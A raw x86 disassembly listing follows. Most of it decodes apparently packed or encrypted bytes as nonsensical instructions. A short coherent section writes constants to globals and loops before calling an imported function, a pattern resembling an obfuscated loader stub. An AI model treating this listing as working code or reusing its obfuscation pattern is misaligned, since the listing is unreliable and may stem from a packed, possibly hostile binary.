  40f1d6:	inc    ecx
  40f1d7:	clc    
  40f1d8:	mov    esi,0x29784d43
  40f1dd:	repnz or al,0x74
  40f1e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1e1:	sbb    al,0x7d
  40f1e3:	ret    0x2be4
  40f1e6:	repz fild DWORD PTR [edx+0x2c]
  40f1ea:	adc    eax,0x816c18e3
  40f1ef:	mov    eax,0x7f164ebd
  40f1f4:	loope  0x40f1be
  40f1f6:	cmp    eax,0xc3cea8b5
  40f1fb:	fisttp DWORD PTR [esi]
  40f1fd:	sub    eax,0x833c0a09
  40f202:	loopne 0x40f24e
  40f204:	ins    DWORD PTR es:[edi],dx
  40f205:	iret   
  40f206:	mov    esp,0x7ce74732
  40f20b:	mov    ebx,gs
  40f20d:	fwait
  40f20e:	loop   0x40f219
  40f210:	mov    dh,0x1c
  40f212:	mov    eax,0xdc5ba8d9
  40f217:	jbe    0x40f24f
  40f219:	push   esi
  40f21a:	sbb    al,0xaa
  40f21c:	sbb    DWORD PTR [ecx+edi*1],esp
  40f21f:	mov    esi,0x2aa067ba
  40f225:	aas    
  40f226:	sti    
  40f227:	inc    ebp
  40f228:	out    0x83,al
  40f22a:	push   es
  40f22b:	int3   
  40f22c:	mov    al,0x5f
  40f22e:	pop    es
  40f22f:	inc    edi
  40f230:	iret   
  40f231:	lods   al,BYTE PTR ds:[esi]
  40f232:	mov    ds:0xe7a223d0,eax
  40f237:	inc    esi
  40f238:	jle    0x40f1c2
  40f23a:	mov    eax,ds:0xcab799c
  40f23f:	leave  
  40f240:	(bad)  
  40f241:	sub    al,0x2
  40f243:	and    ebp,DWORD PTR [edi-0x26]
  40f246:	push   edi
  40f247:	jbe    0x40f20d
  40f249:	or     eax,0xc23a264d
  40f24e:	rcl    DWORD PTR [eax],0xa9
  40f251:	adc    eax,0x518f5201
  40f256:	outs   dx,DWORD PTR ds:[esi]
  40f257:	scas   eax,DWORD PTR es:[edi]
  40f258:	shl    DWORD PTR [edi+0x397fc635],0x1c
  40f25f:	and    al,0xae
  40f261:	int3   
  40f262:	adc    BYTE PTR [ebp+0x7b],ah
  40f265:	jl     0x40f246
  40f267:	add    esp,DWORD PTR [edx]
  40f269:	mov    esp,DWORD PTR [esi]
  40f26b:	xor    DWORD PTR [edi+0x30],esi
  40f26e:	sbb    bh,bh
  40f270:	int    0x75
  40f272:	fisub  WORD PTR ds:0xcad1396
  40f278:	cmp    bh,BYTE PTR [ebp-0x5f0ca886]
  40f27e:	adc    ch,ch
  40f280:	xchg   ebp,esi
  40f282:	sub    BYTE PTR [ebp-0xe],ah
  40f285:	adc    al,bh
  40f287:	pop    ds
  40f288:	adc    al,0xac
  40f28a:	dec    edi
  40f28b:	scas   eax,DWORD PTR es:[edi]
  40f28c:	xor    ebx,ebp
  40f28e:	cmp    DWORD PTR [esi],edx
  40f290:	test   eax,0x65db824d
  40f295:	cwde   
  40f296:	or     ebp,DWORD PTR [edi]
  40f298:	clc    
  40f299:	jg     0x40f2a1
  40f29b:	iret   
  40f29c:	out    0x59,eax
  40f29e:	xchg   esp,eax
  40f29f:	adc    cl,dl
  40f2a1:	or     BYTE PTR [ebp-0x747f0133],0x68
  40f2a8:	xchg   edi,eax
  40f2a9:	sbb    DWORD PTR [ebx+0x3d9fb4b1],edx
  40f2af:	sbb    DWORD PTR [edi+0x26],edx
  40f2b2:	loope  0x40f30e
  40f2b4:	out    dx,al
  40f2b5:	std    
  40f2b6:	aam    0x8b
  40f2b8:	gs js  0x40f24d
  40f2bb:	ins    DWORD PTR es:[edi],dx
  40f2bc:	shl    DWORD PTR [ecx-0x378d29c7],0x9d
  40f2c3:	cld    
  40f2c4:	and    eax,0xa6b36a
  40f2c9:	mov    eax,ds:0xfa8256ce
  40f2ce:	sub    edi,ebp
  40f2d0:	mov    eax,ds:0x53b49427
  40f2d5:	icebp  
  40f2d6:	inc    edi
  40f2d7:	xchg   edx,eax
  40f2d8:	mov    bl,0x50
  40f2da:	mov    esp,0xf82b3b35
  40f2df:	cmp    bl,BYTE PTR [esp+0x2b72caf3]
  40f2e6:	(bad)  
  40f2e7:	cmc    
  40f2e8:	push   edi
  40f2e9:	xchg   ebp,eax
  40f2ea:	shl    DWORD PTR ss:[edx+0x63],1
  40f2ee:	mov    ebx,0x21d259ba
  40f2f3:	retf   0x44f5
  40f2f6:	in     eax,dx
  40f2f7:	fisttp WORD PTR [edx+0x10]
  40f2fa:	rol    bh,0x8
  40f2fd:	into   
  40f2fe:	cmp    eax,0x5e04f2f8
  40f303:	pop    edi
  40f304:	das    
  40f305:	ss call 0x59b87c39
  40f30b:	retf   
  40f30c:	and    BYTE PTR [esi+ebp*8-0x7527c611],ah
  40f313:	mov    bl,0x5a
  40f315:	push   edi
  40f316:	mov    eax,0xa9b99c34
  40f31b:	pop    edx
  40f31c:	push   eax
  40f31d:	sbb    DWORD PTR [edx-0x44],ecx
  40f320:	rol    ah,0x99
  40f323:	and    ecx,ecx
  40f325:	pop    ss
  40f326:	sub    eax,0xa39cb2d9
  40f32b:	xor    bh,dl
  40f32d:	push   edx
  40f32e:	fst    DWORD PTR [edi-0x67379667]
  40f334:	mov    ecx,DWORD PTR [edi-0x65]
  40f337:	pop    esi
  40f338:	add    edi,DWORD PTR [edx-0x80]
  40f33b:	jo     0x40f318
  40f33d:	push   es
  40f33e:	and    al,0x6e
  40f340:	cld    
  40f341:	test   BYTE PTR ds:0xca84319f,bh
  40f347:	adc    BYTE PTR [ecx],dh
  40f349:	repz arpl WORD PTR [esi-0x7e1d95f8],cx
  40f350:	lea    edx,[esi-0x7d387b2f]
  40f356:	lahf   
  40f357:	cmp    ch,BYTE PTR [ebx+0x313c6a6]
  40f35d:	mov    eax,0x2768cf0a
  40f362:	mov    DWORD PTR [edi+0x3ce4624a],ebx
  40f368:	sbb    ah,ah
  40f36a:	ficomp DWORD PTR gs:[ebp+0x272cabcb]
  40f371:	aad    0xc
  40f373:	cmp    ebp,eax
  40f375:	cld    
  40f376:	mov    DWORD PTR [eax-0x2c],eax
  40f379:	inc    edi
  40f37a:	sub    ecx,ecx
  40f37c:	add    dl,dl
  40f37e:	pop    eax
  40f37f:	jp     0x40f3c9
  40f381:	(bad)  
  40f382:	aam    0xff
  40f384:	outs   dx,DWORD PTR ds:[esi]
  40f385:	cli    
  40f386:	inc    ebx
  40f387:	xor    al,0xa8
  40f389:	xchg   edx,eax
  40f38a:	jg     0x40f3a4
  40f38c:	sub    esi,esp
  40f38e:	add    cl,BYTE PTR ds:0xa1e291f2
  40f394:	xchg   ecx,eax
  40f395:	hlt    
  40f396:	push   eax
  40f397:	mov    cl,0xc6
  40f399:	rcl    BYTE PTR [ebx-0x7b394626],cl
  40f39f:	add    eax,0x4bfff67d
  40f3a4:	jp     0x40f3a0
  40f3a6:	bound  esi,QWORD PTR [ecx+0x75]
  40f3a9:	pop    edx
  40f3aa:	push   esi
  40f3ab:	(bad)  
  40f3ac:	dec    esp
  40f3ad:	ins    BYTE PTR es:[edi],dx
  40f3ae:	xor    al,0x23
  40f3b0:	repz mov ecx,0x7c89971c
  40f3b6:	dec    esp
  40f3b7:	daa    
  40f3b8:	dec    ebp
  40f3b9:	stos   DWORD PTR es:[edi],eax
  40f3ba:	data16 aas 
  40f3bc:	mov    al,0xa8
  40f3be:	mov    BYTE PTR [ecx-0x22],cl
  40f3c1:	cmp    DWORD PTR [ebx],esi
  40f3c3:	jmp    0x1f8ca3c2
  40f3c8:	dec    esp
  40f3c9:	inc    edi
  40f3ca:	mov    DWORD PTR [ecx+0x7b],ebp
  40f3cd:	mov    esp,0x997b34c8
  40f3d2:	call   0x7bc8:0x446aa9d8
  40f3d9:	test   esp,edx
  40f3db:	xor    esi,DWORD PTR [edi]
  40f3dd:	int    0x41
  40f3df:	jle    0x40f3ac
  40f3e1:	sbb    eax,0x8777a0fa
  40f3e6:	pop    ebx
  40f3e7:	fbld   TBYTE PTR [ebx+ecx*2+0x2c6299fb]
  40f3ee:	sub    eax,0xfd9bea18
  40f3f3:	aaa    
  40f3f4:	and    BYTE PTR [edx+ebp*1],ch
  40f3f7:	jg     0x40f431
  40f3f9:	ins    BYTE PTR es:[edi],dx
  40f3fa:	sub    BYTE PTR [esi+0x6e],dh
  40f3fd:	clc    
  40f3fe:	pop    eax
  40f3ff:	in     al,0x59
  40f401:	sub    ah,ah
  40f403:	mov    es,WORD PTR [edx+esi*4-0x39]
  40f407:	test   DWORD PTR ds:0xb0023378,esp
  40f40d:	sub    edx,esi
  40f40f:	push   esp
  40f410:	pop    esp
  40f411:	sub    edi,DWORD PTR [ebx-0x5892efeb]
  40f417:	jecxz  0x40f406
  40f419:	or     DWORD PTR [ebp+0x18],ebx
  40f41c:	jmp    0x40f45e
  40f41e:	inc    ebp
  40f41f:	gs cmc 
  40f421:	and    eax,0x906045e0
  40f426:	popa   
  40f427:	gs push eax
  40f429:	rcr    edi,cl
  40f42b:	dec    ebp
  40f42c:	retf   
  40f42d:	cld    
  40f42e:	stc    
  40f42f:	push   ebp
  40f430:	dec    edi
  40f431:	clc    
  40f432:	or     al,0xbc
  40f434:	popa   
  40f435:	stos   DWORD PTR es:[edi],eax
  40f436:	mov    dh,0x43
  40f438:	mov    esi,DWORD PTR [ebx+0x63]
  40f43b:	mov    dl,0xb1
  40f43d:	or     al,0x34
  40f43f:	inc    eax
  40f440:	cmp    DWORD PTR [ebp+0x4b],edi
  40f443:	ret    
  40f444:	mov    DWORD PTR ds:0xfd6e7921,ebx
  40f44a:	adc    BYTE PTR [edx-0x5e],dl
  40f44d:	outs   dx,BYTE PTR ds:[esi]
  40f44e:	dec    ebx
  40f44f:	jns    0x40f470
  40f451:	imul   ebx,DWORD PTR [edx],0xffffffdc
  40f454:	icebp  
  40f455:	mov    al,ds:0x2d284b8d
  40f45a:	and    BYTE PTR [esi-0x2c],ch
  40f45d:	repz cli 
  40f45f:	enter  0x84e2,0xa1
  40f463:	mov    al,0xe1
  40f465:	push   cs
  40f466:	mov    WORD PTR [ebx-0x6b],?
  40f469:	rcr    BYTE PTR [ebx-0x2b9fa05f],cl
  40f46f:	loopne 0x40f3fa
  40f471:	mov    edi,0x35e4d5e2
  40f476:	jmp    0xd1e8f5d6
  40f47b:	xchg   DWORD PTR [ecx],eax
  40f47d:	scas   eax,DWORD PTR es:[edi]
  40f47e:	mov    al,ds:0x26ae11a9
  40f483:	cmp    ecx,DWORD PTR ss:[edi+0x61]
  40f487:	lock mov esp,0x1d5de79e
  40f48d:	nop
  40f48e:	xor    al,0x8b
  40f490:	sub    eax,0xcf64a40a
  40f495:	sub    BYTE PTR [ebp-0x1c63884f],0xc9
  40f49c:	mov    esi,0xe79da779
  40f4a1:	sub    DWORD PTR [eax],ebx
  40f4a3:	and    bl,BYTE PTR [ebx]
  40f4a5:	ret    0x510
  40f4a8:	mov    dl,al
  40f4aa:	loopne 0x40f4f4
  40f4ac:	outs   dx,DWORD PTR ds:[esi]
  40f4ad:	xchg   ecx,eax
  40f4ae:	pop    eax
  40f4af:	jns    0x40f47a
  40f4b1:	jno    0x40f452
  40f4b3:	mov    al,0x96
  40f4b5:	test   al,0x12
  40f4b7:	and    BYTE PTR [ebx*2+0x1c555bd0],dh
  40f4be:	imul   edi,DWORD PTR [edx-0x42],0x15
  40f4c2:	rol    BYTE PTR [edi-0x67],cl
  40f4c5:	push   ebp
  40f4c6:	and    DWORD PTR [edi+0x69d9fe22],ebp
  40f4cc:	out    0xfe,eax
  40f4ce:	and    bl,cl
  40f4d0:	push   edi
  40f4d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4d2:	lock inc ebp
  40f4d4:	idiv   BYTE PTR [edx-0x27]
  40f4d7:	xchg   ecx,eax
  40f4d8:	daa    
  40f4d9:	pop    ss
  40f4da:	xchg   edx,eax
  40f4db:	xchg   ecx,eax
  40f4dc:	call   0xd8c6:0x70553c2e
  40f4e3:	sub    bh,BYTE PTR [esi+0x12]
  40f4e6:	and    BYTE PTR [edi+edi*4],0xca
  40f4ea:	(bad)  
  40f4eb:	push   ebx
  40f4ec:	out    0x51,al
  40f4ee:	push   ecx
  40f4ef:	mov    eax,0xf89c8539
  40f4f4:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  40f4fb:	mov    DWORD PTR ds:0x43477b,0x36a0
  40f505:	push   esi
  40f506:	mov    ecx,DWORD PTR ds:0x43478b
  40f50c:	mov    DWORD PTR [ebp-0x8],eax
  40f50f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f512:	mov    DWORD PTR ds:0x434753,0x6a14
  40f51c:	push   edi
  40f51d:	mov    DWORD PTR ds:0x43477f,0x48b4
  40f527:	mov    edi,0x7510851
  40f52c:	mov    DWORD PTR ds:0x4346bf,0x7e06
  40f536:	mov    esi,0x327299
  40f53b:	mov    DWORD PTR ds:0x43470b,0x7203
  40f545:	cmp    ecx,eax
  40f547:	je     0x40fd56
  40f54d:	or     eax,eax
  40f54f:	jmp    0x40f8e2
  40f554:	cmc    
  40f555:	pop    esp
  40f556:	inc    ebp
  40f557:	gs ins DWORD PTR es:[edi],dx
  40f559:	jge    0x40f550
  40f55b:	pop    esp
  40f55c:	push   0xffffffac
  40f55e:	add    ah,BYTE PTR [esi-0x58]
  40f561:	or     ebx,DWORD PTR [edi]
  40f563:	sbb    DWORD PTR [esi-0xb81814f],0x79
  40f56a:	jle    0x40f5ea
  40f56c:	gs gs daa 
  40f56f:	stos   BYTE PTR es:[edi],al
  40f570:	xor    al,0x66
  40f572:	popf   
  40f573:	fcomp  st(2)
  40f575:	je     0x40f580
  40f577:	dec    esi
  40f578:	leave  
  40f579:	adc    eax,0x7c84738a
  40f57e:	dec    esi
  40f57f:	imul   edx,DWORD PTR [eax+edx*1],0xffffffad
  40f583:	shr    BYTE PTR [edx-0x64d39393],0x85
  40f58a:	or     DWORD PTR [esi],esp
  40f58c:	cmp    bh,BYTE PTR [ebp+0x5b422253]
  40f592:	int    0xa9
  40f594:	jl     0x40f573
  40f596:	cli    
  40f597:	js     0x40f5ec
  40f599:	(bad)  
  40f59a:	jne    0x40f56e
  40f59c:	sub    al,0x70
  40f59e:	sub    ah,BYTE PTR [edi-0x1ffeeea3]
  40f5a4:	(bad)  
  40f5a5:	or     eax,0x67e848a
  40f5aa:	in     al,0x93
  40f5ac:	push   ss
  40f5ad:	push   cs
  40f5ae:	test   BYTE PTR [esi],ah
  40f5b0:	pop    ecx
  40f5b1:	mov    eax,ds:0xfe83a507
  40f5b6:	aas    
  40f5b7:	popa   
  40f5b8:	dec    edx
  40f5b9:	repnz data16 mov dh,BYTE PTR [edi]
  40f5bd:	(bad)  
  40f5be:	test   al,0xa2
  40f5c0:	pop    ebx
  40f5c1:	inc    esp
  40f5c2:	cwde   
  40f5c3:	push   ebp
  40f5c4:	xchg   DWORD PTR [eax],ecx
  40f5c6:	sbb    DWORD PTR [esi-0x50],0xffffffd5
  40f5ca:	xchg   BYTE PTR [ecx-0x5f0cb109],bh
  40f5d0:	or     al,0x22
  40f5d2:	(bad)  
  40f5d3:	push   0xb094896c
  40f5d8:	jle    0x40f5f1
  40f5da:	inc    edi
  40f5db:	imul   eax,eax,0xfffffff7
  40f5de:	das    
  40f5df:	lock xchg ah,cl
  40f5e2:	jno    0x40f5bf
  40f5e4:	mov    DWORD PTR [esp+edi*2-0x60],ebp
  40f5e8:	test   ch,0x18
  40f5eb:	xchg   ebp,eax
  40f5ec:	pop    ss
  40f5ed:	out    0x43,eax
  40f5ef:	(bad)  
  40f5f0:	into   
  40f5f1:	fiadd  DWORD PTR [eax+0x6d]
  40f5f4:	push   ecx
  40f5f5:	jno    0x40f57f
  40f5f7:	ret    0x9054
  40f5fa:	jp     0x40f59b
  40f5fc:	jmp    0xdbd3a956
  40f601:	stc    
  40f602:	add    DWORD PTR [edx+0x9],eax
  40f605:	cwde   
  40f606:	sbb    al,0xde
  40f608:	jb     0x40f673
  40f60a:	repnz fcom st(1)
  40f60d:	stos   DWORD PTR es:[edi],eax
  40f60e:	mov    edi,DWORD PTR [ebp-0x1cbc51f3]
  40f614:	inc    edx
  40f615:	outs   dx,BYTE PTR ds:[esi]
  40f616:	pop    ss
  40f617:	out    dx,eax
  40f618:	jmp    0xa587:0xb487903a
  40f61f:	inc    ecx
  40f620:	and    eax,esi
  40f622:	xor    eax,0x7801b93f
  40f627:	lahf   
  40f628:	sti    
  40f629:	jmp    0x38f5:0x7bee139c
  40f630:	jl     0x40f62e
  40f632:	push   ds
  40f633:	(bad)  
  40f634:	(bad)  
  40f636:	pop    es
  40f637:	dec    ebp
  40f638:	loope  0x40f689
  40f63a:	mov    ch,0x7a
  40f63c:	or     BYTE PTR [ecx-0x70493426],bl
  40f642:	into   
  40f643:	aad    0xf6
  40f645:	pop    ds
  40f646:	stos   BYTE PTR es:[edi],al
  40f647:	adc    DWORD PTR [edi+edx*2-0x19],ecx
  40f64b:	sbb    al,0x2f
  40f64d:	sbb    ch,bh
  40f64f:	popa   
  40f650:	div    DWORD PTR [edx+0x37]
  40f653:	imul   esi,DWORD PTR [eax-0x2c50bf88],0xffffffaa
  40f65a:	push   ss
  40f65b:	dec    esi
  40f65c:	repnz xchg ebx,eax
  40f65e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65f:	push   0xffffffe5
  40f661:	mov    ah,0x83
  40f663:	(bad)  
  40f665:	ss ins DWORD PTR es:[edi],dx
  40f667:	std    
  40f668:	dec    edi
  40f669:	mov    WORD PTR [edi-0x19],gs
  40f66c:	push   ds
  40f66d:	dec    ecx
  40f66e:	or     BYTE PTR [edx+0x491dc837],bl
  40f674:	mov    BYTE PTR [edx+ebp*8+0x3b],al
  40f678:	icebp  
  40f679:	(bad)  
  40f67a:	int3   
  40f67b:	out    dx,al
  40f67c:	in     al,dx
  40f67d:	pop    esp
  40f67e:	pop    es
  40f67f:	cmp    eax,DWORD PTR [ebx+0x6a845bab]
  40f685:	ins    DWORD PTR es:[edi],dx
  40f686:	jecxz  0x40f652
  40f688:	out    dx,eax
  40f689:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f68a:	ins    BYTE PTR es:[edi],dx
  40f68b:	stc    
  40f68c:	jbe    0x40f648
  40f68e:	push   cs
  40f68f:	pop    ebp
  40f690:	sub    ebx,DWORD PTR [ebx+0x56a8f1e4]
  40f696:	add    eax,0x127c589b
  40f69b:	and    BYTE PTR [ecx+0x1b9fc2a3],dl
  40f6a1:	mov    edx,0x677867a2
  40f6a6:	dec    edi
  40f6a7:	push   ds
  40f6a8:	imul   edi,DWORD PTR [ecx-0x7c],0x5e
  40f6ac:	jl     0x40f703
  40f6ae:	rol    ecx,0xd9
  40f6b1:	das    
  40f6b2:	pop    ds
  40f6b3:	fmul   DWORD PTR [ebx]
  40f6b5:	js     0x40f67d
  40f6b7:	sub    eax,0x8cc21a78
  40f6bc:	adc    edi,DWORD PTR [ebp-0x24]
  40f6bf:	pop    esp
  40f6c0:	adc    cl,bl
  40f6c2:	imul   edx,DWORD PTR [ebx-0x12f6c5a0],0xea09bebd
  40f6cc:	add    ecx,DWORD PTR [edx-0x1]
  40f6cf:	pushf  
  40f6d0:	xor    BYTE PTR [esi-0x3d3ba784],ch
  40f6d6:	scas   eax,DWORD PTR es:[edi]
  40f6d7:	inc    ebx
  40f6d8:	push   edx
  40f6d9:	sbb    al,0x81
  40f6db:	pop    edx
  40f6dc:	jg     0x40f6a7
  40f6de:	loope  0x40f6af
  40f6e0:	mov    bl,0xe5
  40f6e2:	js     0x40f6c6
  40f6e4:	mov    edx,0x800d954a
  40f6e9:	js     0x40f740
  40f6eb:	add    al,0xbe
  40f6ed:	fmul   DWORD PTR [edi+0x44]
  40f6f0:	mov    edx,0x7ad91916
  40f6f5:	add    eax,0x72229caa
  40f6fa:	cmp    ebx,esi
  40f6fc:	ffreep st(0)
  40f6fe:	push   ebp
  40f6ff:	pop    ss
  40f700:	out    0x22,al
  40f702:	mov    ah,0x9f
  40f704:	xchg   ebp,eax
  40f705:	iret   
  40f706:	mov    dh,0x8e
  40f708:	pop    ebp
  40f709:	leave  
  40f70a:	cs addr16 jle 0x40f719
  40f70e:	adc    DWORD PTR [eax+0x4a],0xffffffd0
  40f712:	daa    
  40f713:	sub    ah,BYTE PTR [esi+0x3a4147a9]
  40f719:	adc    bh,cl
  40f71b:	adc    al,0xcf
  40f71d:	jbe    0x40f744
  40f71f:	fisttp WORD PTR [esi+ebp*4-0x358ca4db]
  40f726:	jae    0x40f777
  40f728:	sub    al,0xa7
  40f72a:	shl    ah,cl
  40f72c:	aaa    
  40f72d:	(bad)  
  40f72e:	dec    bl
  40f730:	shl    BYTE PTR [ebx],1
  40f732:	mov    ecx,0xeffe9af2
  40f737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f738:	cdq    
  40f739:	sub    BYTE PTR [edi+ebp*8+0x5d],bh
  40f73d:	adc    al,0xd1
  40f73f:	into   
  40f740:	add    ecx,esi
  40f742:	movddup xmm6,QWORD PTR [esi]
  40f746:	adc    BYTE PTR [esi-0x68b63d9e],0x6a
  40f74d:	or     al,BYTE PTR [ecx-0x80]
  40f750:	jecxz  0x40f74b
  40f752:	enter  0x7e39,0x1c
  40f756:	and    eax,0x3267a8e8
  40f75b:	stc    
  40f75c:	pop    edi
  40f75d:	shl    ebx,1
  40f75f:	in     al,dx
  40f760:	adc    eax,0x70a8ca13
  40f765:	out    dx,al
  40f766:	ror    DWORD PTR [edi+0x2a],cl
  40f769:	aad    0x76
  40f76b:	mov    edx,es
  40f76d:	sbb    eax,0x4464918a
  40f772:	sbb    ebx,esi
  40f774:	adc    dh,dh
  40f776:	mov    esi,0x16029a9c
  40f77b:	jl     0x40f709
  40f77d:	(bad)  
  40f77e:	repz add BYTE PTR [esi-0x2d],dh
  40f782:	jno    0x40f74d
  40f784:	and    DWORD PTR [ebp-0x500acefb],esp
  40f78a:	outs   dx,BYTE PTR ds:[esi]
  40f78b:	ja     0x40f7e5
  40f78d:	aaa    
  40f78e:	cmc    
  40f78f:	mov    ?,WORD PTR [ebp+0x28a971be]
  40f795:	mov    eax,ebp
  40f797:	(bad)  
  40f798:	xchg   BYTE PTR [edx],bl
  40f79a:	fisub  DWORD PTR es:[ebx-0x653721b5]
  40f7a1:	pop    esi
  40f7a2:	scas   eax,DWORD PTR es:[edi]
  40f7a3:	push   ecx
  40f7a4:	mov    ch,0xeb
  40f7a6:	sbb    al,0x6c
  40f7a8:	mov    ebp,0xd40c33db
  40f7ad:	into   
  40f7ae:	cmc    
  40f7af:	aaa    
  40f7b0:	mov    bh,0x8d
  40f7b2:	cmc    
  40f7b3:	xchg   ebp,eax
  40f7b4:	jmp    0x461a:0xdf9b88a1
  40f7bb:	cmc    
  40f7bc:	push   ss
  40f7bd:	push   edx
  40f7be:	xchg   ebp,eax
  40f7bf:	into   
  40f7c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7c1:	in     eax,dx
  40f7c2:	adc    BYTE PTR [ecx],ch
  40f7c4:	mov    eax,0x2c207e2c
  40f7c9:	out    0x3d,al
  40f7cb:	sub    BYTE PTR [edi],0xe1
  40f7ce:	xchg   ecx,eax
  40f7cf:	and    eax,0x61d43347
  40f7d4:	adc    eax,0x8d0d01f7
  40f7d9:	xchg   BYTE PTR [edi-0x178c91df],dh
  40f7df:	pop    eax
  40f7e0:	mov    ch,0x27
  40f7e2:	xor    eax,0xc1961d42
  40f7e7:	mov    ah,0xe2
  40f7e9:	adc    eax,0xee57aaa9
  40f7ee:	xor    al,dh
  40f7f0:	mov    eax,0x5a521373
  40f7f5:	sbb    ebx,edx
  40f7f7:	fisttp QWORD PTR [esi+0x4e]
  40f7fa:	push   eax
  40f7fb:	cdq    
  40f7fc:	dec    esp
  40f7fd:	jbe    0x40f805
  40f7ff:	and    eax,0xb217656f
  40f804:	add    eax,0xe3438974
  40f809:	jno    0x40f7e6
  40f80b:	or     edi,ebx
  40f80d:	inc    edi
  40f80e:	or     eax,0x76da6aef
  40f813:	jmp    0xf749b69e
  40f818:	(bad)  
  40f819:	out    dx,eax
  40f81a:	daa    
  40f81b:	sub    ebp,DWORD PTR [ebx]
  40f81d:	cmp    cl,BYTE PTR [esp+esi*8+0x2a58c58]
  40f824:	inc    esi
  40f825:	adc    eax,0x513b766d
  40f82a:	mov    edi,0x34224c3c
  40f82f:	and    dh,BYTE PTR [eax+esi*2+0x53]
  40f833:	imul   ebx,ebx,0xc7c5e65a
  40f839:	push   edx
  40f83a:	xor    al,0xf2
  40f83c:	dec    ebx
  40f83d:	mov    ch,0x75
  40f83f:	mov    ds:0x1d292cd,al
  40f844:	loope  0x40f813
  40f846:	jle    0x40f881
  40f848:	or     eax,DWORD PTR [esi-0x2e]
  40f84b:	out    dx,eax
  40f84c:	fiadd  WORD PTR [esi]
  40f84e:	repnz in al,dx
  40f850:	scas   eax,DWORD PTR es:[edi]
  40f851:	sar    bl,cl
  40f853:	popf   
  40f854:	dec    bp
  40f856:	adc    edi,DWORD PTR [edx+eiz*1-0x78]
  40f85a:	cdq    
  40f85b:	aaa    
  40f85c:	mov    ds:0x5c223c77,eax
  40f861:	loopne 0x40f846
  40f863:	fdivr  st(7),st
  40f865:	dec    eax
  40f866:	and    eax,0xd373a2aa
  40f86b:	pop    esi
  40f86c:	enter  0x3510,0x4b
  40f870:	add    BYTE PTR [ecx+esi*8],dl
  40f873:	xchg   edi,eax
  40f874:	in     al,dx
  40f875:	das    
  40f876:	jl     0x40f8c8
  40f878:	jecxz  0x40f8ce
  40f87a:	icebp  
  40f87b:	inc    ebp
  40f87c:	cs (bad) 
  40f87e:	sti    
  40f87f:	pop    edx
  40f880:	mov    esi,0xc94e099d
  40f885:	push   ecx
  40f886:	lock pop esp
  40f888:	inc    ebx
  40f889:	jns    0x40f881
  40f88b:	(bad)  
  40f88c:	int    0x94
  40f88e:	and    eax,0xa3dde6e8
  40f893:	jle    0x40f89c
  40f895:	(bad)  
  40f897:	push   ebx
  40f898:	mov    al,ds:0x54447da9
  40f89d:	stos   DWORD PTR es:[edi],eax
  40f89e:	or     al,0xdf
  40f8a0:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40f8a2:	push   DWORD PTR [esi+0x6331946b]
  40f8a8:	inc    ebp
  40f8a9:	dec    ebx
  40f8aa:	out    dx,al
  40f8ab:	call   0x3b69:0xdf85a1b9
  40f8b2:	fadd   st,st(4)
  40f8b4:	mov    ah,0x92
  40f8b6:	inc    ebx
  40f8b7:	inc    edi
  40f8b8:	xor    al,0x6d
  40f8ba:	(bad)  
  40f8bb:	pop    edx
  40f8bc:	push   es
  40f8bd:	sub    DWORD PTR [eax-0x2e],0xe89d843d
  40f8c4:	sahf   
  40f8c5:	jne    0x40f946
  40f8c7:	pusha  
  40f8c8:	arpl   WORD PTR [edx],cx
  40f8ca:	xchg   esi,eax
  40f8cb:	sbb    ah,dh
  40f8cd:	pushf  
  40f8ce:	pop    ss
  40f8cf:	aad    0x3d
  40f8d1:	loopne 0x40f8cb
  40f8d3:	cmp    al,0x96
  40f8d5:	aaa    
  40f8d6:	push   cs
  40f8d7:	jmp    0x40f87a
  40f8d9:	mov    edx,0x9d0bfee8
  40f8de:	mov    ch,0x37
  40f8e0:	ret    0x8b6c
  40f8e3:	inc    ebp
  40f8e4:	cld    
  40f8e5:	mov    ecx,DWORD PTR [ebp+0xc]
  40f8e8:	xor    DWORD PTR ds:0x4346bf,0x43474f
  40f8f2:	xor    eax,edi
  40f8f4:	add    eax,esi
  40f8f6:	mov    DWORD PTR ds:0x43470b,0x4bab
  40f900:	cmp    eax,ecx
  40f902:	mov    DWORD PTR ds:0x43478f,0x3e53
  40f90c:	je     0x40fd56
  40f912:	and    DWORD PTR ds:0x434713,edi
  40f918:	mov    eax,DWORD PTR [ebp-0x4]
  40f91b:	mov    edx,DWORD PTR ds:0x43466b
  40f921:	xor    DWORD PTR ds:0x4346d3,edx
  40f927:	xor    eax,edi
  40f929:	and    DWORD PTR ds:0x43473f,0x0
  40f933:	mov    edx,DWORD PTR ds:0x43473f
  40f939:	inc    edx
  40f93a:	mov    DWORD PTR ds:0x43473f,edx
  40f940:	cmp    DWORD PTR ds:0x43473f,0x9
  40f947:	jne    0x40f96a
  40f94d:	push   0x4346cb
  40f952:	push   0x434812
  40f957:	push   0x7b5f
  40f95c:	push   0x5aad
  40f961:	push   DWORD PTR [ebp-0xc]
  40f964:	call   DWORD PTR ds:0x4132a4
  40f96a:	cmp    DWORD PTR ds:0x43473f,0x8
  40f971:	jne    0x40f986
  40f977:	xor    edx,edx
  40f979:	xor    edx,DWORD PTR ds:0x43473f
  40f97f:	inc    edx
  40f980:	mov    DWORD PTR ds:0x43473f,edx
  40f986:	cmp    DWORD PTR ds:0x43473f,0x10
  40f98d:	jb     0x40f933
  40f993:	and    DWORD PTR ds:0x43473f,edx
  40f999:	add    eax,esi
  40f99b:	push   eax
  40f99c:	push   DWORD PTR [ebp-0x8]
  40f99f:	push   DWORD PTR [ebp-0x4]
  40f9a2:	mov    edx,DWORD PTR ds:0x414afe
  40f9a8:	jmp    0x40fd3b
  40f9ad:	pop    ebx
  40f9ae:	pop    edi
  40f9af:	cld    
  40f9b0:	sub    edi,esp
  40f9b2:	mov    ebp,0x81a66f6d
  40f9b7:	push   esi
  40f9b8:	in     eax,dx
  40f9b9:	(bad)  
  40f9bb:	fiadd  DWORD PTR [edi+0x14]
  40f9be:	mov    ebp,0x79f47e7e
  40f9c3:	jle    0x40fa43
  40f9c5:	sub    al,0x1c
  40f9c7:	push   ebp
  40f9c8:	repnz xor ch,BYTE PTR ds:0x85a1b092
  40f9cf:	jo     0x40f9c5
